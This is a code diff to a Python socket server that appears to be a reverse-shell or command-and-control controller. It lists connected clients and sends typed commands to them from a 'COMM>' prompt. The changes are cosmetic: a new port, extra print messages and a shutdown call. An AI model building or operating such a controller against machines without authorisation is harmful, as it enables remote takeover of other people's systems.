@@ -18,7 +18,7 @@ AVAILABLE_COMMANDS = [
 class Server:
     def __init__(self):
         self.host = ''
-        self.port = 7777
+        self.port = 9898
         self.socket = None
         self.connections = []
         self.addresses = []
@@ -67,10 +67,11 @@ class Server:
                 self.addresses.append(addr)
             except Exception as e:
                 print('Error accepting connections: %s' % str(e))
-            print('\nConnection has been established with: {0}'.format(addr[0]))
+            print('\nConnection has been established with: {0}'.format(addr))
         return
     
     def list(self):
+        print("-----------CLIENTS------------\nCLIENT_ID       ADDR\n")
         for i, conn in enumerate(self.connections):
             try:
                 conn.send(str.encode(" "))
@@ -81,16 +82,17 @@ class Server:
                 if i<len(self.addresses):
                     del self.addresses[i]
                 continue
-            print(f"{i}: {self.addresses[i]}")
+            print(f"{i}: {self.addresses[i]}\n")
         return 
     def shutdown(self):
         threads_queue.task_done()
         threads_queue.task_done()
+        self.quit_gracefully()
         print("Server shutdown Successful!")
         return
     
     def send_commands(self, client_id, conn):
-        print(f"Now you can send commands to {self.addresses[client_id]}!")
+        print(f"Now you can send commands to {self.addresses[client_id]}!\n")
         conn.send(str.encode(" "))
         pwd = conn.recv(20480)
         pwd = pwd.decode('utf-8')
@@ -131,6 +133,7 @@ class Server:
             
             
     def start_comm(self):
+        print("ENTER 'help' to get list of commands!\n")
         while True:
             command = input("COMM> ")
             split_command = command.strip().split()
